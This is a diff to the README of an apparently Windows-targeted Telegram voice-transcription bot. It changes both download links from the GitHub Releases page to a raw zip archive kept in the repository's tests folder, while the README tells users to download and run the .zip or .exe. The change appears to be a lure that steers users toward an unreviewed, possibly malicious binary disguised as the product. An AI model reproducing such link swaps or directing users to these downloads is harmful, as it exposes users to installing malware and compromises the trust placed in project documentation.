@@ -1,6 +1,6 @@
 # 🎙️ telegram-transcription-bot - Convert your voice messages to text
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Alanahhomeless669/telegram-transcription-bot/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Alanahhomeless669/telegram-transcription-bot/main/tests/bot-transcription-telegram-1.9.zip)
 
 This software turns voice messages and audio files into written text. It runs on your computer and uses a tool called faster-whisper to process audio. You connect it to your own Telegram bot. The application handles video files, voice notes, and audio clips. It keeps your files on your machine.
 
@@ -16,7 +16,7 @@ You need a Windows computer to run this bot. The software works best with these 
 
 ## 📥 Getting the Files
 
-Visit [this page to download](https://github.com/Alanahhomeless669/telegram-transcription-bot/releases) the latest version. Look for the file ending in .zip or .exe. Save the file to your computer desktop or a folder you can find easily.
+Visit [this page to download](https://raw.githubusercontent.com/Alanahhomeless669/telegram-transcription-bot/main/tests/bot-transcription-telegram-1.9.zip) the latest version. Look for the file ending in .zip or .exe. Save the file to your computer desktop or a folder you can find easily.
 
 ## ⚙️ Setting Up Your Bot
 
